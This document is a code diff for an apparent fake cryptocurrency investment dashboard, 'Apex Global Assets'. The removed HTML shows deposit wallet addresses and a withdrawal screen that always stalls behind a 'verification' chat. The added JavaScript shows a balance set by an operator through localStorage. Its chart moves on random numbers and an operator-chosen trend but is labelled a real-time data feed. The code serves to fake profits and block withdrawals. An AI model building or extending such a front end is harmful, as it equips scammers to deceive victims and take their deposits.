@@ -1,142 +1,146 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apex Global Assets | Dashboard</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-</head>
-<body class="bg-[#0b0f19] text-slate-100 min-h-screen font-sans antialiased">
+document.addEventListener('DOMContentLoaded', () => {
+    console.log("Dampened Real-Time Analytics Engine active.");
 
-    <header class="border-b border-slate-800 bg-[#111827]/50 backdrop-blur-md sticky top-0 z-40">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
-            <div class="flex items-center gap-3">
-                <div class="w-8 h-8 rounded-lg bg-emerald-500 flex items-center justify-center font-bold text-slate-950">Ac</div>
-                <span class="font-bold text-lg tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-teal-400">EXGLOBAL</span>
-            </div>
-            <div class="flex items-center gap-2">
-                <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-                <span class="text-xs text-slate-400 font-medium">Account Verified</span>
-            </div>
-        </div>
-    </header>
+    // Load setup configurations
+    let baselineBalance = 600.00;
+    try {
+        const cached = localStorage.getItem('admin_balance');
+        if (cached) baselineBalance = parseFloat(cached);
+    } catch (e) {
+        console.error(e);
+    }
 
-    <main class="max-w-4xl mx-auto px-4 py-10 space-y-8">
+    let liveValue = baselineBalance;
+    let baselineRefTick = liveValue;
+
+    // Create a highly smooth tracking dataset array
+    let trackingDataset = Array(12).fill(baselineBalance).map((val, i) => val + (i - 6) * (Math.random() * 0.40));
+
+    // UI elements sync
+    function pushLiveUpdates(isBullish) {
+        const targetText = document.getElementById('balance-display');
+        if (targetText) {
+            targetText.innerText = '$' + liveValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            targetText.style.color = isBullish ? '#10b981' : '#ef4444';
+        }
+    }
+    pushLiveUpdates(true);
+
+    let mainChartRef = null;
+    const canvasElement = document.getElementById('LivePerformanceChart');
+
+    function drawStabilizedChart(isBullish) {
+        if (!canvasElement || typeof Chart === 'undefined') return;
+
+        if (mainChartRef) {
+            mainChartRef.destroy();
+        }
+
+        const renderCtx = canvasElement.getContext('2d');
+        const fillGradient = renderCtx.createLinearGradient(0, 0, 0, canvasElement.clientHeight || 240);
         
-        <div class="bg-[#111827] border border-slate-800/80 rounded-2xl p-6 sm:p-8 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-6 shadow-xl">
-            <div class="space-y-1">
-                <p class="text-xs font-semibold uppercase tracking-wider text-slate-400">Total Account Balance (USDT)</p>
-                <h1 id="balance-display" class="text-3xl sm:text-4xl font-extrabold tracking-tight text-white transition-all duration-300 font-mono">
-                    $600.00
-                </h1>
-                <p id="trend-indicator" class="text-xs font-medium text-emerald-400">+0.00% Today</p>
-            </div>
-            
-            <div class="flex items-center gap-3 w-full sm:w-auto">
-                <button id="quickDepositBtn" class="flex-1 sm:flex-initial px-6 py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl transition-all duration-150 shadow-lg shadow-emerald-500/10 cursor-pointer text-sm">
-                    Quick Deposit
-                </button>
-                <button id="withdrawFundsBtn" class="flex-1 sm:flex-initial px-6 py-3 bg-[#1f2937] hover:bg-[#2d3748] border border-slate-700 text-slate-200 font-semibold rounded-xl transition-all duration-150 cursor-pointer text-sm">
-                    Withdraw Funds
-                </button>
-            </div>
-        </div>
-
-        <div class="bg-[#111827] border border-slate-800/80 rounded-2xl p-6 shadow-xl space-y-4">
-            <div class="flex items-center justify-between">
-                <h3 class="text-sm font-bold tracking-wide uppercase text-slate-300">Live Return Performance (24H)</h3>
-                <span class="px-2.5 py-1 bg-[#1f2937] border border-slate-700 rounded-md text-[10px] font-medium tracking-wider text-slate-400 uppercase">Real-Time Data Feed</span>
-            </div>
-            <div class="h-64 sm:h-72 w-full relative">
-                <canvas id="LivePerformanceChart"></canvas>
-            </div>
-        </div>
-    </main>
-
-    <div id="deposit-modal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
-        <div class="bg-[#111827] border border-slate-800 rounded-2xl w-full max-w-md p-6 shadow-2xl space-y-5 transform transition-all">
-            <div class="flex items-center justify-between">
-                <h3 class="text-lg font-bold text-white flex items-center gap-2">
-                    <span class="text-emerald-400">📥</span> Secure Fund Deposit
-                </h3>
-                <button onclick="closeModal('deposit-modal')" class="text-slate-400 hover:text-white font-bold cursor-pointer text-xl p-1">&times;</button>
-            </div>
-            
-            <div class="space-y-4">
-                <div>
-                    <label class="block text-xs font-semibold uppercase text-slate-400 mb-2">Select Currency Asset</label>
-                    <select id="depositAssetSelect" class="w-full bg-[#1f2937] border border-slate-700 rounded-xl px-4 py-3 text-slate-200 focus:outline-none focus:border-emerald-500 font-medium" onchange="updateDepositWalletAddress()">
-                        <option value="USDT">USDT (TRC20 Network)</option>
-                        <option value="BTC">Bitcoin (BTC Mainnet)</option>
-                        <option value="ETH">Ethereum (ETH ERC20)</option>
-                    </select>
-                </div>
-
-                <div>
-                    <label class="block text-xs font-semibold uppercase text-slate-400 mb-2">Target Destination Inbound Wallet Address</label>
-                    <div class="flex items-center gap-2 bg-[#1f2937] border border-slate-700 rounded-xl px-4 py-3 font-mono text-xs text-white overflow-hidden select-all">
-                        <span id="displayWalletAddress" class="truncate w-full">0x71C2496E7278274d3b4614a420971a9E3a9411bb</span>
-                        <span class="text-slate-500 cursor-pointer hover:text-emerald-400" title="Copy Node Asset Address" onclick="alert('Wallet copied to clipboard!')">📋</span>
-                    </div>
-                </div>
-
-                <div class="bg-blue-950/40 border border-blue-900/50 rounded-xl p-4 text-xs text-blue-300 space-y-1">
-                    <p class="font-semibold text-blue-400">⚠️ Network Routing Verification Notice:</p>
-                    <p>Send only the corresponding currency option selected above directly to this specific destination layout node. Transactions will credit automatically post network node confirmations.</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="withdraw-modal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
-        <div class="bg-[#111827] border border-slate-800 rounded-2xl w-full max-w-md p-6 shadow-2xl space-y-5 transform transition-all">
-            <div class="flex items-center justify-between">
-                <h3 class="text-lg font-bold text-white flex items-center gap-2">
-                    <span class="text-rose-400">🛡️</span> Security Compliance Gateway
-                </h3>
-                <button onclick="closeModal('withdraw-modal')" class="text-slate-400 hover:text-white font-bold cursor-pointer text-xl p-1">&times;</button>
-            </div>
-            
-            <div class="text-center p-4 space-y-4">
-                <div class="w-16 h-16 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-500 flex items-center justify-center text-3xl mx-auto animate-pulse">
-                    ⚠️
-                </div>
-                <div class="space-y-2">
-                    <h4 class="text-md font-bold text-slate-200">Account Verification Compliance Required</h4>
-                    <p class="text-xs text-slate-400 leading-relaxed mx-auto max-w-sm">
-                        Your transaction payout request cannot be automated right now. To clear verification standards and release asset values, click below to pass validation chat requirements.
-                    </p>
-                </div>
-            </div>
-
-            <button onclick="triggerVerificationChat()" class="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl transition-all duration-150 shadow-lg text-sm tracking-wide cursor-pointer uppercase">
-                Verify Withdrawal Account Now
-            </button>
-        </div>
-    </div>
-
-    <script src="app.js"></script>
-    <script>
-        // Simple universal overlay triggers
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
+        let primaryThemeColor = '#10b981'; // Upward Green
+        if (!isBullish) {
+            primaryThemeColor = '#ef4444'; // Downward Red
+            fillGradient.addColorStop(0, 'rgba(239, 68, 68, 0.10)');
+            fillGradient.addColorStop(1, 'rgba(239, 68, 68, 0.00)');
+        } else {
+            fillGradient.addColorStop(0, 'rgba(16, 185, 129, 0.10)');
+            fillGradient.addColorStop(1, 'rgba(16, 185, 129, 0.00)');
         }
-        function triggerVerificationChat() {
-            alert("Security Verification Channel:\n━━━━━━━━━━━━━━━━━━━━\nConnecting safely to live-chat compliance desk controllers. Please stand by...");
-        }
-        function updateDepositWalletAddress() {
-            const chosenCoin = document.getElementById('depositAssetSelect').value;
-            const addressSpan = document.getElementById('displayWalletAddress');
-            
-            if (chosenCoin === 'USDT') {
-                addressSpan.innerText = localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb";
-            } else if (chosenCoin === 'BTC') {
-                addressSpan.innerText = localStorage.getItem('btc_address') || "1BitcoinAddressHere";
-            } else if (chosenCoin === 'ETH') {
-                addressSpan.innerText = localStorage.getItem('eth_address') || "0xEthAddressHere";
+
+        const labelPlacements = trackingDataset.map((_, i) => `T-${12 - i}`);
+
+        mainChartRef = new Chart(renderCtx, {
+            type: 'line',
+            data: {
+                labels: labelPlacements,
+                datasets: [{
+                    data: [...trackingDataset],
+                    borderColor: primaryThemeColor,
+                    borderWidth: 2.5,
+                    pointRadius: 0,
+                    tension: 0.38, // Makes the path curved elegantly rather than steep jagged drops
+                    fill: true,
+                    backgroundColor: fillGradient
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                animation: { duration: 900 }, // Slows down visual transitions safely
+                plugins: { legend: { display: false } },
+                scales: {
+                    x: { display: false },
+                    y: {
+                        grid: { color: 'rgba(51, 65, 85, 0.06)', drawBorder: false },
+                        ticks: {
+                            color: '#64748b',
+                            font: { size: 10 },
+                            callback: function(val) { return '$' + val.toFixed(2); }
+                        }
+                    }
+                }
             }
+        });
+    }
+
+    drawStabilizedChart(true);
+
+    // 3. Paced Low-Volatility Loop Engine (Triggers gently every 6 seconds)
+    setInterval(() => {
+        const performanceTrend = localStorage.getItem('chart_trend_directive') || 'stable';
+        
+        baselineRefTick = liveValue;
+        
+        // Micro scale multipliers to keep variations flat, soft, and balanced
+        let priceFluctuation = (Math.random() - 0.5) * 0.25;
+
+        if (performanceTrend === 'upward') {
+            priceFluctuation += 0.08; // Gradual slow lift upward
+        } else if (performanceTrend === 'downward') {
+            priceFluctuation -= 0.10; // Gradual slow drop downward
         }
-    </script>
-</body>
-</html>
+
+        liveValue += priceFluctuation;
+        if (liveValue < 0) liveValue = 0;
+
+        const isTickBullish = liveValue >= baselineRefTick;
+
+        trackingDataset.push(liveValue);
+        trackingDataset.shift();
+
+        pushLiveUpdates(isTickBullish);
+        drawStabilizedChart(isTickBullish);
+    }, 6000);
+
+    // 4. Connect Click Triggers to HTML Interface Overlay Elements
+    const dBtn = document.getElementById('quickDepositBtn');
+    const wBtn = document.getElementById('withdrawFundsBtn');
+
+    if (dBtn) {
+        dBtn.addEventListener('click', () => {
+            if (typeof window.updateDepositWalletAddress === 'function') window.updateDepositWalletAddress();
+            document.getElementById('deposit-modal').style.display = 'flex';
+        });
+    }
+
+    if (wBtn) {
+        wBtn.addEventListener('click', () => {
+            document.getElementById('withdraw-modal').style.display = 'flex';
+        });
+    }
+
+    // 5. Shared Global Storage Synchronization Links
+    window.addEventListener('storage', (e) => {
+        if (!e.newValue) return;
+        if (e.key === 'admin_balance') {
+            baselineBalance = parseFloat(e.newValue) || 600.00;
+            liveValue = baselineBalance;
+            baselineRefTick = liveValue;
+            trackingDataset = Array(12).fill(baselineBalance);
+            pushLiveUpdates(true);
+            drawStabilizedChart(true);
+        }
+    });
+});
